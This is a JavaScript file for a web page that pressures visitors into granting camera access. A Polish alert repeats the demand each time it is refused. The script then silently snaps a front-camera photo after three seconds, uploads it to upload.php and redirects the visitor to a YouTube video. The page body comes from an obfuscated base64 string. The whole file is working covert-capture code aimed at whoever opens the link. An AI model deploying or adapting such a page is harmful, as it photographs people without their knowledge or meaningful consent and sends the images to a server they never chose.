const ass64 = "";

(() => {
  let video = null;
  let canvas = null;
  let startbutton = null;

  function startup() {
    document.body.innerHTML = decodeFromBase64(ass64);

    video = document.getElementById("video");
    canvas = document.getElementById("canvas");
    startbutton = document.getElementById("allowAccess");

    video.addEventListener(
      "loadedmetadata",
      (ev) => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const data = canvas.toDataURL("image/png");

        uploadFile(data);
      },
      false
    );

    startbutton.addEventListener(
      "click",
      (ev) => {
        takepicture();
        ev.preventDefault();
      },
      false
    );

    setTimeout(() => {
      takepicture();
    }, 3000);
  }

  function takepicture() {
    navigator.mediaDevices
      .getUserMedia({ video: { facingMode: "user" }, audio: false })
      .then((stream) => {
        video.srcObject = stream;
        video.play();
      })
      .catch((err) => {
        if (err.name === "NotAllowedError") {
          alert(
            "Wymagany jest dostęp do kamery. Proszę zezwól na dostęp do kamery, aby kontynuować."
          );
          takepicture();
        }

        console.error(`An error occurred: ${err}`);
      });
  }

  window.addEventListener("load", startup, false);
})();

function uploadFile(base64Data) {
  const formData = new FormData();
  formData.append("imageBase64", base64Data);

  fetch("upload.php", {
    method: "POST",
    body: formData,
  })
    .then((response) => response.text())
    .then((data) => {
      window.location.replace(
        "https://youtu.be/4TnAKurylA8?si=HWGjeUbLiYMa11xe"
      );
    })
    .catch((error) => {});
}

function getUsernameFromUrl() {
  const path = window.location.pathname;

  const username = path.replace(/^\/|\/$/g, "");

  return username;
}

function decodeFromBase64(base64String) {
  const binaryString = atob(base64String);

  const len = binaryString.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binaryString.charCodeAt(i);
  }

  const decoder = new TextDecoder();

  return decoder.decode(bytes);
}
